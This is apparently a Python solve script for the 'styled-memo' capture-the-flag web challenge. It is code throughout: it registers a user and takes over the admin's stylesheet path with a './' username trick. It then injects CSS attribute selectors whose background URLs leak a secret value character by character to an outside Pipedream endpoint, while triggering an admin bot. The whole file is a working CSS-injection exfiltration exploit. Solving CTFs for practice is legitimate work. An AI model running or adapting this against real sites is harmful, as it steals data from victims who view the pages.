import random
import time
from io import StringIO
from string import ascii_lowercase, ascii_uppercase, digits

import requests

APP_ORIGIN = "https://styled-memo.web.wanictf.org"
# APP_ORIGIN = "http://localhost:8080"
PIPEDREAM_ENDPOINT = ""
PIPEDREAM_SOURCE_ID = ""
PIPEDREAM_API_KEY = ""
PIPEDREAM_API_ENDPOINT = (
    f"https://api.pipedream.com/v1/sources/{PIPEDREAM_SOURCE_ID}/event_summaries"
)

chars = ascii_lowercase + ascii_uppercase + digits

s = requests.session()

username = "".join(random.sample(chars, 8))

# ユーザ登録
url = f"{APP_ORIGIN}/register"
r = s.get(url)
r = s.post(
    url,
    data={"username": username, "password1": "hoge", "password2": "hoge"},
    headers={"referer": url, "X-CSRFToken": s.cookies.get("csrftoken")},
)

# adminのusername取得
admin_username = r.text[
    r.text.find("username: ") + len("username: ") : r.text.find("がFLAGを持っているようです。")
]
print(admin_username)

chars += "{}_-@"

flag = ""
while not flag.endswith("}"):
    # css injection のためのcssを作成
    css = "\n".join(
        [
            f'.btn-memo-detail[data-content^="{flag+c}"]{{background:url({PIPEDREAM_ENDPOINT}/?flag={flag+c})}}'
            for c in chars
        ]
    )

    # usernameを変更し、cssをupload
    url = f"{APP_ORIGIN}/user"
    r = s.post(
        url,
        data={"username": f"./{admin_username}"},
        files={"css": ("example.css", StringIO(css))},
        headers={"referer": url, "X-CSRFToken": s.cookies.get("csrftoken")},
    )

    # adminに確認してもらう
    s.get(f"{APP_ORIGIN}/crawl")

    time.sleep(1)

    new_flag = ""
    while not len(flag) == len(new_flag) - 1:
        time.sleep(1)
        # pipedream apiで確認
        pipedream_res = requests.get(
            PIPEDREAM_API_ENDPOINT,
            headers={"Authorization": f"Bearer {PIPEDREAM_API_KEY}"},
        ).json()
        new_flag = pipedream_res["data"][0]["event"]["query"]["flag"]
    flag = new_flag
    print(flag)
